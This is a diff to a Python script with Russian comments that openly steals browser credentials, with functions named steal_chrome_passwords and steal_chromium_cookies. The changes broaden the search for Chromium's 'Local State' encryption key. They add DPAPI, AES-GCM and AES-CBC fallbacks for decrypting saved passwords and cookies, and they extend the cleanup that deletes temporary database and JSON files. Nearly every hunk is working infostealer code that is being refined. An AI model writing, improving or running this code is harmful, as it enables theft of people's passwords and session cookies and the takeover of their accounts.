@@ -396,17 +396,29 @@ def get_encryption_key(profile_path):
     # Поиск Local State в текущей и родительской папке
     local_state_path = Path(profile_path) / "Local State"
     if not local_state_path.exists():
+        # Ищем в родительской папке (User Data)
         parent_local_state = Path(profile_path).parent / "Local State"
         if parent_local_state.exists():
             local_state_path = parent_local_state
         else:
-            # Попробуем найти в корне User Data
+            # Ищем в корне User Data
             user_data_path = Path(profile_path).parent.parent / "Local State"
             if user_data_path.exists():
                 local_state_path = user_data_path
             else:
-                print(f"Файл Local State не найден: {profile_path}")
-                return None
+                # Расширенный поиск для разных браузеров
+                possible_paths = [
+                    Path(profile_path).parent.parent / "Local State",
+                    Path(profile_path).parent.parent.parent / "Local State",
+                    Path(profile_path).parent.parent.parent.parent / "Local State"
+                ]
+                for path in possible_paths:
+                    if path.exists():
+                        local_state_path = path
+                        break
+                else:
+                    print(f"Файл Local State не найден: {profile_path}")
+                    return None
     
     try:
         with open(local_state_path, 'r', encoding='utf-8') as f:
@@ -429,18 +441,17 @@ def get_encryption_key(profile_path):
         return None
 
 def decrypt_chromium_value(encrypted_value, key):
-    """100% расшифровка значений для Chromium (пароли и куки)"""
+    """Улучшенная расшифровка значений для Chromium"""
     try:
         # Если значение пустое, сразу возвращаем пустую строку
         if not encrypted_value:
             return ""
         
-        # Проверяем, зашифровано ли значение
+        # Если это не байты, возвращаем как есть
         if not isinstance(encrypted_value, bytes):
-            # Если это строка, просто возвращаем
             return encrypted_value
         
-        # Старые версии Chrome (DPAPI)
+        # Для Windows: попробовать DPAPI
         if platform.system() == "Windows" and HAS_WIN32CRYPT:
             try:
                 decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
@@ -452,13 +463,11 @@ def decrypt_chromium_value(encrypted_value, key):
             except:
                 pass
         
-        # Новые версии Chrome (AES-GCM)
+        # Обработка AES-GCM (v10/v11)
         if len(encrypted_value) > 3:
-            # Проверяем префиксы v10/v11
             prefix = encrypted_value[:3]
             if prefix in (b'v10', b'v11'):
                 try:
-                    # Формат: vXX (3 байта) + nonce (12 байт) + зашифрованный текст + tag (16 байт)
                     nonce = encrypted_value[3:15]
                     ciphertext = encrypted_value[15:-16]
                     tag = encrypted_value[-16:]
@@ -466,7 +475,7 @@ def decrypt_chromium_value(encrypted_value, key):
                     plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                     return plaintext.decode('utf-8')
                 except Exception as e:
-                    # Если не удалось, пробуем альтернативный формат (без тега)
+                    # Попробовать без тега
                     try:
                         nonce = encrypted_value[3:15]
                         ciphertext = encrypted_value[15:]
@@ -476,19 +485,38 @@ def decrypt_chromium_value(encrypted_value, key):
                     except:
                         pass
         
-        # Для Linux/MacOS
-        if key and len(encrypted_value) > 3:
+        # Обработка AES-CBC (старые версии)
+        if key and len(encrypted_value) > 15:
             try:
-                # Формат: vXX (3 байта) + nonce (12 байт) + зашифрованный текст
-                nonce = encrypted_value[3:15]
-                ciphertext = encrypted_value[15:]
+                # Первые 3 байта - "v10", следующие 12 - IV?
+                if encrypted_value.startswith(b'v10'):
+                    iv = encrypted_value[3:15]
+                    ciphertext = encrypted_value[15:]
+                else:
+                    iv = encrypted_value[:16]
+                    ciphertext = encrypted_value[16:]
+                
+                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+                plaintext = cipher.decrypt(ciphertext)
+                # Удаляем PKCS7 padding
+                padding_length = plaintext[-1]
+                plaintext = plaintext[:-padding_length]
+                return plaintext.decode('utf-8')
+            except:
+                pass
+        
+        # Для Linux/MacOS: AES-GCM без префикса
+        if key and len(encrypted_value) > 12:
+            try:
+                nonce = encrypted_value[:12]
+                ciphertext = encrypted_value[12:]
                 cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                 plaintext = cipher.decrypt(ciphertext)
                 return plaintext.decode('utf-8')
             except:
                 pass
         
-        # Если ничего не сработало, пробуем DPAPI для Windows
+        # Последняя попытка: DPAPI для Windows
         if platform.system() == "Windows" and HAS_WIN32CRYPT:
             try:
                 decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
@@ -500,9 +528,9 @@ def decrypt_chromium_value(encrypted_value, key):
             except:
                 pass
         
-        # Последняя попытка: просто декодируем как строку
+        # Если ничего не сработало, вернуть как строку
         try:
-            return encrypted_value.decode('utf-8')
+            return encrypted_value.decode('utf-8', errors='ignore')
         except:
             return base64.b64encode(encrypted_value).decode('utf-8')
             
@@ -547,7 +575,10 @@ def steal_chrome_passwords(browser_name, profile_path):
                 continue
         
         conn.close()
-        os.remove(temp_db)
+        try:
+            os.remove(temp_db)
+        except:
+            pass
         return passwords
     except Exception as e:
         print(f"Ошибка при краже паролей {browser_name}: {e}")
@@ -576,7 +607,7 @@ def steal_chromium_cookies(browser_name, profile_path):
             try:
                 host, name, value, path, expires, secure, encrypted_value = item
                 
-                # Всегда используем encrypted_value, если оно доступно
+                # Приоритет - encrypted_value
                 if encrypted_value and isinstance(encrypted_value, bytes):
                     cookie_value = decrypt_chromium_value(encrypted_value, key)
                 else:
@@ -599,7 +630,10 @@ def steal_chromium_cookies(browser_name, profile_path):
                 continue
         
         conn.close()
-        os.remove(temp_db)
+        try:
+            os.remove(temp_db)
+        except:
+            pass
         return cookies
     except Exception as e:
         print(f"Ошибка при краже куки {browser_name}: {e}")
@@ -919,7 +953,7 @@ def cleanup():
             
         # Удаляем временные файлы
         for file in Path(tempfile.gettempdir()).iterdir():
-            if file.name.startswith("temp_") and file.name.endswith(".db"):
+            if file.name.startswith("temp_") and (file.name.endswith(".db") or file.name.endswith(".json")):
                 try:
                     file.unlink()
                 except:
